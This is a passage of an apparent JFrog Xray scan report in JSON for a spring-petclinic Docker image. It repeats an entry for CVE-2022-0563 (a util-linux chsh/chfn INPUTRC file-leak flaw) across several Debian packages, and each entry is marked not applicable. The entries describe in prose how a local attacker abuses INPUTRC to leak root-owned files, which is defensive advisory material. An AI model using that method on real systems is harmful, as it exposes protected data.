            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libpcre2-8-0:10.36-2",
            "vulnerability_id": "CVE-2022-41409",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libmount1",
         "source_id": "deb://debian:bullseye:libmount1",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:mount",
         "source_id": "deb://debian:bullseye:mount",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsmartcols1",
         "source_id": "deb://debian:bullseye:libsmartcols1",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libuuid1",
         "source_id": "deb://debian:bullseye:libuuid1",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:bsdutils",
         "source_id": "deb://debian:bullseye:bsdutils",
         "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-0563",
                     "cwe": [
                        "CWE-209"
                     ],
                     "cwe_details": {
                        "CWE-209": {
                           "name": "Generation of Error Message Containing Sensitive Information",
                           "description": "The product generates an error message that includes sensitive information about its environment, users, or associated data."
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-198072",
            "VulnerabilityTitle": "",
            "ShortDescription": "Improper file-read in util-linux chsh and chfn tools can lead to sensitive data leakage when an attacker controls the INPUTRC environment variable.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities.\n`chsh` is used to change the login shell. `chfn` is used to change finger information.\n\nThe [GNU Readline library](https://tiswww.case.edu/php/chet/readline/rltop.html) provides a set of functions for use by applications that allow users to edit command lines as they are typed in. The Readline library is loads a library configuration file, passed via the `INPUTRC` environment variable.\n\nWhen the `chsh` and `chfn` are compiled with the `readline` library, and the `INPUTRC` environment variable is defined to a non-valid library config file, it will print an error message and leak some data from the malformed config file. \n\nThe major Linux distributions: Alpine, Debian and Ubuntu don’t use the `util-linux` package to compile `chsh` and `chfn` - instead they use the `shadow` package which isn’t vulnerable to this issue.\n\nAlso, Red Hat compiles `util-linux` without linking the vulnerable `readline` library.\n\nSince both of these tools have root-`setuid` permissions by default, a local attacker can in theory leak partial data from arbitrary (root-owned) files in the system by running them with an arbitrary `INPUTRC` environment variable.\n\nBut, when manually compiling `util-linux` from a vulnerable source, and installing this version on the system, the utilities lose their `setuid` flag. This is a feature of Linux systems that removes the `setuid` after a file has been modified. It must be manually enabled again using `chmod u+s` to read root-owned files.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nIf a vulnerable version of `util-linux` was compiled manually, remove the SUID bit from the `chsh` and `chfn` tools using the `chmod u-s` command on them.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "All the major Linux distributions don’t use a vulnerable version of the tools. Also, when manually compiling the tools from the source, the `setuid` flag is removed from the tools, thus losing access to leak the contents from root-owned files.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Partial file data leakage",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker may set the `INPUTRC` environment variable to an arbitrary file that should be leaked",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can only be exploited by an attacker that can execute code on the vulnerable machine (excluding exceedingly rare circumstances)",
                  "Description": "",
                  "IsPositive": 1,
                  "InsertOrder": 1
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Advisory",
                  "Url": "https://github.com/advisories/GHSA-5896-67mw-rv4j",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "cve_id": "CVE-2022-0563",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable binaries chfn/chsh are not compiled with GNU Readline, which makes them not vulnerable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libuuid1:2.36.1-8+deb11u1",
            "vulnerability_id": "CVE-2022-0563",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-198072",
         "severity": "Low",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an \"INPUTRC\" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.",
         "issue_type": "security",
         "provider": "JFrog",
